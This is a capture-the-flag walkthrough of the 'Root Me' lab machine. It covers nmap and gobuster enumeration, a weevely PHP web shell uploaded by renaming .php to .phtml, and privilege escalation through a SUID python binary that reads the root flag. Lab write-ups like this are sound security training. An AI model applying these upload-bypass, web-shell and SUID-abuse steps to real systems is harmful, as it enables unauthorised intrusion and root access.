# Root Me
## Enumeration
``` 
nmap -sV -sS -A -o nmap.out {your ip}
In Nmap I found:
Port 80 Is Running Apache Server
Port 22 Is Running SSH
```
```
# Nmap 7.80 scan initiated Sun May  9 21:44:56 2021 as: nmap -sV -sS -A -o nmap.out 10.10.85.5
Nmap scan report for 10.10.85.5
Host is up (0.22s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   58.49 ms  10.17.0.1
2   ... 4
5   198.58 ms 10.10.85.5

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May  9 21:46:45 2021 -- 1 IP address (1 host up) scanned in 110.05 seconds
```
# website Lookup
```
Nothing In Website
So i started gobuster
gobuster -u {your ip} -w /usr/share/dirb/wordlists/common.txt
```
![Alt](https://raw.githubusercontent.com/pmk456/root_me_ctf/main/images/buster.png)
```
Found /panel and /uploads
In Panel We Have Access To Upload Files.
```
![Alt](https://raw.githubusercontent.com/pmk456/root_me_ctf/main/images/panel.png)
```
I Fired Up Terminal And Immediately Installed weevely
About Weevely:
Weevely Is A PHP reverse shell listener and creator 
command = weevely generate {your pass} shell.php 
 shell.php 
Lets Upload It Now.
```
![Alt](https://raw.githubusercontent.com/pmk456/root_me_ctf/main/images/php-not-allow.png)
#### I Transalated It Using Google Transalate
![Alt(https://raw.githubusercontent.com/pmk456/root_me_ctf/main/images/transalate.png)
#### Php Is Not Allowed
#### Lets See Hint Which FILE UPLOAD BYPASS
#### I googled It And Got This
### So i Renamed From .php to .phtml
![Alt](uplaod.png)
### Now It Is Uploaded
![Alt](https://raw.githubusercontent.com/pmk456/root_me_ctf/main/images/success.png)
```
I Remember I Also Found A Hidden Directory Named /uploads In Gobuster Lets Visit it Now
```
### Thats All We Need Lets Open It shell.phtml
![Alt](https://raw.githubusercontent.com/pmk456/root_me_ctf/main/images/uploads.png)

### Now I Fired Terminal And Typed
```
weevely http://{your-ip}/uploads/shell.phtml 5142
```
## Boom I Got A Reverse Shell
![Alt](https://raw.githubusercontent.com/pmk456/root_me_ctf/main/images/rev-shell.png)
### Lets CD To user.txt
```
user.txt was present inside /var/www/
```
![Alt](https://raw.githubusercontent.com/pmk456/root_me_ctf/main/images/user.png)
# Privilage Escalation
### We Got Nothing using sudo -l
### So I Started Search For Files with SUID Permission
```
find / -user root -perm /4000
```
### /usr/bin/python is Too Suspicious
![Alt](https://raw.githubusercontent.com/pmk456/root_me_ctf/main/images/python-weird.png)
### I Know A Trick Here To Get Root.txt 
```
python -c 'print(open("/root/root.txt").read())'
```
## Boom Escalation In Less Than 30 Seconds
![Alt](https://raw.githubusercontent.com/pmk456/root_me_ctf/main/images/priv.png)
# Machine Hacked By Patan Musthakheem Khan
##### github.com/pmk456
